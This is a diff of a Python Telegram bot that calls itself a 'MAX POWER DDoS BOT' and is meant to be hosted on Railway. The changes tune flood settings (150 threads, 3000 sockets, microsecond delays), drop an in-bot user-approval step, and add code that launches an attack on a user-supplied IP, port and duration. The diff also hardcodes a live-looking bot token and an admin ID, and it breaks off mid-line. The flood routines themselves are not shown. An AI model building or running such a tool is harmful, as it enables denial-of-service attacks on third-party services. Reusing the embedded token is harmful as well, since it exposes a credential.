@@ -1,3 +1,4 @@
+# bot_railway_max.py - Maximum power for Railway (150 threads + burst)
 import asyncio
 import threading
 import time
@@ -11,19 +12,19 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
 # ============ CONFIG ============
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8576723884:AAFBd3WYuHVqTtFp-qvtRh3uFJoq_Q5zomQ)
-ADMIN_IDS = [int(os.environ.get("8210011971", 0))] # Replace 0 with your admin ID
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8576723884:AAFBd3WYuHVqTtFp-qvtRh3uFJoq_Q5zomQ")
+ADMIN_IDS = [int(os.environ.get("ADMIN_ID", 8210011971))]
 BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001}
 
 # ============ MAX POWER SETTINGS (Railway Limit) ============
 class AttackConfig:
  def __init__(self):
- self.threads = 150
- self.sockets_per_thread = 20
- self.delay = 0.00001
+ self.threads = 150 # MAX for Railway
+ self.sockets_per_thread = 20 # Each thread 20 sockets = 3000 streams
+ self.delay = 0.00001 # 10 microseconds
  self.packet_size = 512
-
 config = AttackConfig()
+
 attack_running = False
 attack_stats = {'packets': 0, 'target': '', 'method': '', 'start': 0, 'duration': 0}
 stats_lock = threading.Lock()
@@ -31,21 +32,17 @@ user_data = {}
 
 # ============ SIMPLE DB ============
 USERS_FILE = "users.json"
-
 def load_users():
  if os.path.exists(USERS_FILE):
  with open(USERS_FILE, 'r') as f:
  return json.load(f)
  return {}
-
 def save_users(users):
  with open(USERS_FILE, 'w') as f:
  json.dump(users, f)
-
 def is_approved(uid):
  users = load_users()
  return users.get(str(uid), {}).get('approved', False)
-
 def approve_user(uid, days):
  users = load_users()
  users[str(uid)] = {'approved': True, 'expires': (datetime.now() + timedelta(days=days)).isoformat()}
@@ -205,8 +202,7 @@ async def start_cmd(update, context):
  keyboard = [
  [InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")],
  [InlineKeyboardButton("⚙️ SETTINGS", callback_data="settings")],
- [InlineKeyboardButton("📊 STATS", callback_data="stats")],
- [InlineKeyboardButton("🔑 APPROVE USER", callback_data="approve_user")]
+ [InlineKeyboardButton("📊 STATS", callback_data="stats")]
  ]
  await update.message.reply_text(
  f"🔥 *MAX POWER DDoS BOT* 🔥\n\n"
@@ -301,9 +297,6 @@ async def button_callback(update, context):
  [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
  ]
  await query.edit_message_text(msg, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
- elif data == "approve_user":
- await query.edit_message_text("🔑 *APPROVE USER*\n\nSend user ID to approve:")
- user_data[uid] = {'step': 'approve_id'}
 
 async def handle_message(update, context):
  uid = update.effective_user.id
@@ -345,10 +338,7 @@ async def handle_message(update, context):
  port = step_data['port']
  method = step_data.get('method', 'mixed')
  del user_data[uid]
- keyboard = [
- [InlineKeyboardButton("💀 START", callback_data=f"start_{ip}_{port}_{duration}_{method}")],
- [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
- ]
+ keyboard = [[InlineKeyboardButton("💀 START", callback_data=f"start_{ip}_{port}_{duration}_{method}")], [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]]
  await update.message.reply_text(
  f"💀 *CONFIRM*\n\n🎯 {ip}:{port}\n⚙️ {method.upper()}\n⏱️ {duration}s\n\nStart?",
  parse_mode='Markdown',
@@ -356,13 +346,6 @@ async def handle_message(update, context):
  )
  except:
  await update.message.reply_text("❌ Duration 5-300")
- elif step == 'approve_id':
- try:
- user_id = int(text)
- approve_user(user_id, 365)
- await update.message.reply_text(f"✅ User {user_id} approved for 1 year!")
- except:
- await update.message.reply_text("❌ Invalid user ID")
 
 async def method_callback(update, context):
  query = update.callback_query
@@ -378,3 +361,13 @@ async def method_callback(update, context):
  await query.edit_message_text(f"✅ Method: {method.upper()}\n\nSend duration (5-300s):")
  elif data.startswith("start_"):
  parts = data.split("_")
+ ip = parts[1]
+ port = int(parts[2])
+ duration = int(parts[3])
+ method = parts[4]
+ if uid in user_data:
+ del user_data[uid]
+ await query.edit_message_text(f"🚀 Launching {method.upper()} attack on {ip}:{port}...")
+ loop = asyncio.get_event_loop()
+ def send_cb(msg, markup=None):
+ asyncio.run_coroutine_threadsafe(query.message.reply_text(msg, parse_mode
